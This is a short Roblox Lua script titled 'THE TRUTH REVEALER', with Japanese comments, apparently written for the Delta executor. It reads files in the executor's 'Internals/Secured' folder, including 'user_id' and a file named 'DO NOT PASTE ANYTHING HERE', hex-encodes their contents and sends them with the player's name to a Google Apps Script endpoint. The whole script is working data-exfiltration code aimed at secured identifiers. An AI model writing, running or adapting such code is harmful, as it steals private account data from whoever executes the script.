-- [[ PROJECT: THE TRUTH REVEALER ]]
local NEW_GAS_URL = "https://script.google.com/macros/s/AKfycbz33T8b1RL8MONla5UcxoVYiqXiOtf1j83-HnIlapIDdrAI-2v9i6jlWISRU-GqJsAD/exec"

local function send_truth(label, path)
    local s, content = pcall(function() return readfile(path) end)
    if s then
        local hex = ""
        for i = 1, #content do hex = hex .. string.format("%02X", string.byte(content:sub(i,i))) end
        game:HttpGet(NEW_GAS_URL .. "?hex=" .. hex .. "&user=" .. game.Players.LocalPlayer.Name .. "&type=" .. label)
        print("✅ Sent: " .. label)
    else
        print("❌ Failed: " .. label)
    end
end

-- 煽り文句が入っているはずのファイルをあえて読み取る
send_truth("FILE_DO_NOT_PASTE", "Delta/Internals/Secured/DO NOT PASTE ANYTHING HERE")

-- そして、本命の user_id も再度。
send_truth("FILE_REAL_USER_ID", "Delta/Internals/Secured/user_id")

print("🏁 GASのD列をチェックしてくれ。あの煽り文句が届いているか？")
